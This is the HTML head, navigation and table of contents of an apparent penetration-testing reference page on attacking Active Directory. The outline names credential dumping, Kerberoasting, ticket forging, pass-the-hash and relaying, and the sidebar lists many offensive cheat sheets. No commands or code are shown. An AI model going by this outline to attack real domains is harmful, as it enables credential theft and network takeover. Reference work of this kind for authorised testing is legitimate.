<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Tactics, techniques and methodologies for enumerating and attacking Active Directory">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="Active Directory Attacks" />
<meta property="og:description" content="Tactics, techniques and methodologies for enumerating and attacking Active Directory" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/attacking_active_directory/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2022-12-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-02-20T17:10:49-05:00" />
<title>Active Directory Attacks | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce="v6fQG2hYHmw1rpUUC6mr9w"></script><script nonce="v6fQG2hYHmw1rpUUC6mr9w">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();</script>
<script>(function(){

'use strict';var aa=function(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}},ba="function"==typeof Object.create?Object.create:function(a){var b=function(){};b.prototype=a;return new b},k;if("function"==typeof Object.setPrototypeOf)k=Object.setPrototypeOf;else{var m;a:{var ca={a:!0},n={};try{n.__proto__=ca;m=n.a;break a}catch(a){}m=!1}k=m?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+" is not extensible");return a}:null}
var p=k,q=function(a,b){a.prototype=ba(b.prototype);a.prototype.constructor=a;if(p)p(a,b);else for(var c in b)if("prototype"!=c)if(Object.defineProperties){var d=Object.getOwnPropertyDescriptor(b,c);d&&Object.defineProperty(a,c,d)}else a[c]=b[c];a.v=b.prototype},r=this||self,da=function(){},t=function(a){return a};var u;var w=function(a,b){this.g=b===v?a:""};w.prototype.toString=function(){return this.g+""};var v={},x=function(a){if(void 0===u){var b=null;var c=r.trustedTypes;if(c&&c.createPolicy){try{b=c.createPolicy("goog#html",{createHTML:t,createScript:t,createScriptURL:t})}catch(d){r.console&&r.console.error(d.message)}u=b}else u=b}a=(b=u)?b.createScriptURL(a):a;return new w(a,v)};var A=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)};var B={},C=null;var D="function"===typeof Uint8Array;function E(a,b,c){return"object"===typeof a?D&&!Array.isArray(a)&&a instanceof Uint8Array?c(a):F(a,b,c):b(a)}function F(a,b,c){if(Array.isArray(a)){for(var d=Array(a.length),e=0;e<a.length;e++){var f=a[e];null!=f&&(d[e]=E(f,b,c))}Array.isArray(a)&&a.s&&G(d);return d}d={};for(e in a)Object.prototype.hasOwnProperty.call(a,e)&&(f=a[e],null!=f&&(d[e]=E(f,b,c)));return d}
function ea(a){return F(a,function(b){return"number"===typeof b?isFinite(b)?b:String(b):b},function(b){var c;void 0===c&&(c=0);if(!C){C={};for(var d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),e=["+/=","+/","-_=","-_.","-_"],f=0;5>f;f++){var h=d.concat(e[f].split(""));B[f]=h;for(var g=0;g<h.length;g++){var l=h[g];void 0===C[l]&&(C[l]=g)}}}c=B[c];d=Array(Math.floor(b.length/3));e=c[64]||"";for(f=h=0;h<b.length-2;h+=3){var y=b[h],z=b[h+1];l=b[h+2];g=c[y>>2];y=c[(y&3)<<
4|z>>4];z=c[(z&15)<<2|l>>6];l=c[l&63];d[f++]=""+g+y+z+l}g=0;l=e;switch(b.length-h){case 2:g=b[h+1],l=c[(g&15)<<2]||e;case 1:b=b[h],d[f]=""+c[b>>2]+c[(b&3)<<4|g>>4]+l+e}return d.join("")})}var fa={s:{value:!0,configurable:!0}},G=function(a){Array.isArray(a)&&!Object.isFrozen(a)&&Object.defineProperties(a,fa);return a};var H;var J=function(a,b,c){var d=H;H=null;a||(a=d);d=this.constructor.u;a||(a=d?[d]:[]);this.j=d?0:-1;this.h=null;this.g=a;a:{d=this.g.length;a=d-1;if(d&&(d=this.g[a],!(null===d||"object"!=typeof d||Array.isArray(d)||D&&d instanceof Uint8Array))){this.l=a-this.j;this.i=d;break a}void 0!==b&&-1<b?(this.l=Math.max(b,a+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(c)for(b=0;b<c.length;b++)a=c[b],a<this.l?(a+=this.j,(d=this.g[a])?G(d):this.g[a]=I):(d=this.l+this.j,this.g[d]||(this.i=this.g[d]={}),(d=this.i[a])?
G(d):this.i[a]=I)},I=Object.freeze(G([])),K=function(a,b){if(-1===b)return null;if(b<a.l){b+=a.j;var c=a.g[b];return c!==I?c:a.g[b]=G([])}if(a.i)return c=a.i[b],c!==I?c:a.i[b]=G([])},M=function(a,b){var c=L;if(-1===b)return null;a.h||(a.h={});if(!a.h[b]){var d=K(a,b);d&&(a.h[b]=new c(d))}return a.h[b]};J.prototype.toJSON=function(){var a=N(this,!1);return ea(a)};
var N=function(a,b){if(a.h)for(var c in a.h)if(Object.prototype.hasOwnProperty.call(a.h,c)){var d=a.h[c];if(Array.isArray(d))for(var e=0;e<d.length;e++)d[e]&&N(d[e],b);else d&&N(d,b)}return a.g},O=function(a,b){H=b=b?JSON.parse(b):null;a=new a(b);H=null;return a};J.prototype.toString=function(){return N(this,!1).toString()};var P=function(a){J.call(this,a)};q(P,J);function ha(a){var b,c=(a.ownerDocument&&a.ownerDocument.defaultView||window).document,d=null===(b=c.querySelector)||void 0===b?void 0:b.call(c,"script[nonce]");(b=d?d.nonce||d.getAttribute("nonce")||"":"")&&a.setAttribute("nonce",b)};var Q=function(a,b){b=String(b);"application/xhtml+xml"===a.contentType&&(b=b.toLowerCase());return a.createElement(b)},R=function(a){this.g=a||r.document||document};R.prototype.appendChild=function(a,b){a.appendChild(b)};var S=function(a,b,c,d,e,f){try{var h=a.g,g=Q(a.g,"SCRIPT");g.async=!0;g.src=b instanceof w&&b.constructor===w?b.g:"type_error:TrustedResourceUrl";ha(g);h.head.appendChild(g);g.addEventListener("load",function(){e();d&&h.head.removeChild(g)});g.addEventListener("error",function(){0<c?S(a,b,c-1,d,e,f):(d&&h.head.removeChild(g),f())})}catch(l){f()}};var ia=r.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),ja=r.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),ka=r.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),la=function(a,b,c){this.h=a;this.j=new R(this.h);this.g=null;this.i=[];this.l=!1;this.o=b;this.m=c},V=function(a){if(a.h.body&&!a.l){var b=
function(){T(a);r.setTimeout(function(){return U(a,3)},50)};S(a.j,a.o,2,!0,function(){r[a.m]||b()},b);a.l=!0}},T=function(a){for(var b=W(1,5),c=0;c<b;c++){var d=X(a);a.h.body.appendChild(d);a.i.push(d)}b=X(a);b.style.bottom="0";b.style.left="0";b.style.position="fixed";b.style.width=W(100,110).toString()+"%";b.style.zIndex=W(2147483544,2147483644).toString();b.style["background-color"]=ma(249,259,242,252,219,229);b.style["box-shadow"]="0 0 12px #888";b.style.color=ma(0,10,0,10,0,10);b.style.display=
"flex";b.style["justify-content"]="center";b.style["font-family"]="Roboto, Arial";c=X(a);c.style.width=W(80,85).toString()+"%";c.style.maxWidth=W(750,775).toString()+"px";c.style.margin="24px";c.style.display="flex";c.style["align-items"]="flex-start";c.style["justify-content"]="center";d=Q(a.j.g,"IMG");d.className=A();d.src=ia;d.style.height="24px";d.style.width="24px";d.style["padding-right"]="16px";var e=X(a),f=X(a);f.style["font-weight"]="bold";f.textContent=ja;var h=X(a);h.textContent=ka;Y(a,
e,f);Y(a,e,h);Y(a,c,d);Y(a,c,e);Y(a,b,c);a.g=b;a.h.body.appendChild(a.g);b=W(1,5);for(c=0;c<b;c++)d=X(a),a.h.body.appendChild(d),a.i.push(d)},Y=function(a,b,c){for(var d=W(1,5),e=0;e<d;e++){var f=X(a);b.appendChild(f)}b.appendChild(c);c=W(1,5);for(d=0;d<c;d++)e=X(a),b.appendChild(e)},W=function(a,b){return Math.floor(a+Math.random()*(b-a))},ma=function(a,b,c,d,e,f){return"rgb("+W(Math.max(a,0),Math.min(b,255)).toString()+","+W(Math.max(c,0),Math.min(d,255)).toString()+","+W(Math.max(e,0),Math.min(f,
255)).toString()+")"},X=function(a){a=Q(a.j.g,"DIV");a.className=A();return a},U=function(a,b){0>=b||null!=a.g&&0!=a.g.offsetHeight&&0!=a.g.offsetWidth||(na(a),T(a),r.setTimeout(function(){return U(a,b-1)},50))},na=function(a){var b=a.i;var c="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];b=c?c.call(b):{next:aa(b)};for(c=b.next();!c.done;c=b.next())(c=c.value)&&c.parentNode&&c.parentNode.removeChild(c);a.i=[];(b=a.g)&&b.parentNode&&b.parentNode.removeChild(b);a.g=null};var pa=function(a,b,c,d,e){var f=oa(c),h=function(l){l.appendChild(f);r.setTimeout(function(){f?(0!==f.offsetHeight&&0!==f.offsetWidth?b():a(),f.parentNode&&f.parentNode.removeChild(f)):a()},d)},g=function(l){document.body?h(document.body):0<l?r.setTimeout(function(){g(l-1)},e):b()};g(3)},oa=function(a){var b=document.createElement("div");b.className=a;b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.left="-10000px";b.style.top="-10000px";b.style.zIndex="-10000";return b};var L=function(a){J.call(this,a)};q(L,J);var qa=function(a){J.call(this,a)};q(qa,J);var ra=function(a,b){this.l=a;this.m=new R(a.document);this.g=b;this.i=K(this.g,1);b=M(this.g,2);this.o=x(K(b,4)||"");this.h=!1;b=M(this.g,13);b=x(K(b,4)||"");this.j=new la(a.document,b,K(this.g,12))};ra.prototype.start=function(){sa(this)};
var sa=function(a){ta(a);S(a.m,a.o,3,!1,function(){a:{var b=a.i;var c=r.btoa(b);if(c=r[c]){try{var d=O(P,r.atob(c))}catch(e){b=!1;break a}b=b===K(d,1)}else b=!1}b?Z(a,K(a.g,14)):(Z(a,K(a.g,8)),V(a.j))},function(){pa(function(){Z(a,K(a.g,7));V(a.j)},function(){return Z(a,K(a.g,6))},K(a.g,9),K(a.g,10),K(a.g,11))})},Z=function(a,b){a.h||(a.h=!0,a=new a.l.XMLHttpRequest,a.open("GET",b,!0),a.send())},ta=function(a){var b=r.btoa(a.i);a.l[b]&&Z(a,K(a.g,5))};(function(a,b){r[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];r[a]=da;b.apply(null,d)}})("__h82AlnkH6D91__",function(a){"function"===typeof window.atob&&(new ra(window,O(qa,window.atob(a)))).start()});}).call(this);

window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hVTV9oOG1BMHF6c2xHRlBZR0xrS2g0UHRVX21ERkZSWVBjcTFBZU1aN0diVW5xSGRzNlR5OUZTYWlsM0thZ28tb19BU3hqbjRyZFdLOGhzVUlHbmFqalZRXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZScnBMVGFzQ1JjSDBxSkpfSVhRWmd1YXQxZ292Ty01YlN0WUJXNGJUTThTNjlTdUU0WkVQVnZKZ0E2WC1UY1VNTlRLbXc3V1hLU2NoY1pJaHFOTVJ2UmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFUxMG44RWlxNnBhUEw5Q1lOcjBZcG1xdTVuZzVzTkR3Zm5yN1pSRVExWEt5UlBLMFJxS1RST2Y0Q3B5S0pIUFpVem83MldIU3VrbWlKb1p4c2Y2RzJwLWdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZDb2RlRVZCbFQxdXA5MUMzZ0V0dVFROVVxbVBSVGwwS2Qyc1FqcF9GWHV3WGxFYUhVekNvSWIxUzJtQnZ4T3Q5eHJra19vNWRXbWFfYl83dl9JRlVpeHdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VjRnWnE1WHlLaXVNS3lHdUU1Y2ZISDdoNWUtb0VVZktOekNTWEgzYmN2U285OTNYLTFuc0VkU19SZjRjUTNYZjZJSEdyaGFIb1FNc1hqMFhZUGcwMFU5d1x1MDAzZFx1MDAzZCJd");</script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="active">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Active Directory Attacks</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#active-directory-attacks">Active Directory Attacks</a>
      <ul>
        <li><a href="#tools">Tools</a></li>
        <li><a href="#active-directory-recon">Active Directory Recon</a>
          <ul>
            <li><a href="#using-bloodhound">Using BloodHound</a></li>
            <li><a href="#using-powerview">Using PowerView</a></li>
            <li><a href="#using-ad-module">Using AD Module</a></li>
            <li><a href="#other-interesting-commands">Other Interesting Commands</a></li>
          </ul>
        </li>
        <li><a href="#most-common-paths-to-ad-compromise">Most common paths to AD compromise</a>
          <ul>
            <li><a href="#ms14-068-microsoft-kerberos-checksum-validation-vulnerability">MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)</a></li>
            <li><a href="#from-cve-to-system-shell-on-dc">From CVE to SYSTEM shell on DC</a></li>
            <li><a href="#open-shares">Open Shares</a></li>
            <li><a href="#scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</a></li>
            <li><a href="#passwords-in-sysvol--group-policy-preferences">Passwords in SYSVOL &amp; Group Policy Preferences</a></li>
            <li><a href="#exploit-group-policy-objects-gpo">Exploit Group Policy Objects GPO</a></li>
            <li><a href="#dumping-ad-domain-credentials">Dumping AD Domain Credentials</a></li>
            <li><a href="#user-hunting">User Hunting</a></li>
            <li><a href="#password-spraying">Password spraying</a></li>
            <li><a href="#password-in-ad-user-comment">Password in AD User comment</a></li>
            <li><a href="#password-of-pre-created-computer-account">Password of Pre-Created Computer Account</a></li>
            <li><a href="#reading-laps-password">Reading LAPS Password</a></li>
            <li><a href="#reading-gmsa-password">Reading GMSA Password</a></li>
            <li><a href="#forging-golden-gmsa">Forging Golden GMSA</a></li>
            <li><a href="#pass-the-ticket-golden-tickets">Pass-the-Ticket Golden Tickets</a></li>
            <li><a href="#pass-the-ticket-silver-tickets">Pass-the-Ticket Silver Tickets</a></li>
            <li><a href="#kerberoasting">Kerberoasting</a></li>
            <li><a href="#krb_as_rep-roasting">KRB_AS_REP Roasting</a></li>
            <li><a href="#pass-the-hash">Pass-the-Hash</a></li>
            <li><a href="#overpass-the-hash-pass-the-key">OverPass-the-Hash (pass the key)</a></li>
            <li><a href="#capturing-and-cracking-net-ntlmv1ntlmv1-hashes">Capturing and cracking Net-NTLMv1/NTLMv1 hashes</a></li>
            <li><a href="#capturing-and-cracking-net-ntlmv2ntlmv2-hashes">Capturing and cracking Net-NTLMv2/NTLMv2 hashes</a></li>
            <li><a href="#man-in-the-middle-attacks--relaying">Man-in-the-Middle attacks &amp; relaying</a></li>
            <li><a href="#active-directory-certificate-services">Active Directory Certificate Services</a></li>
            <li><a href="#unpac-the-hash">UnPAC The Hash</a></li>
            <li><a href="#shadow-credentials">Shadow Credentials</a></li>
            <li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
            <li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
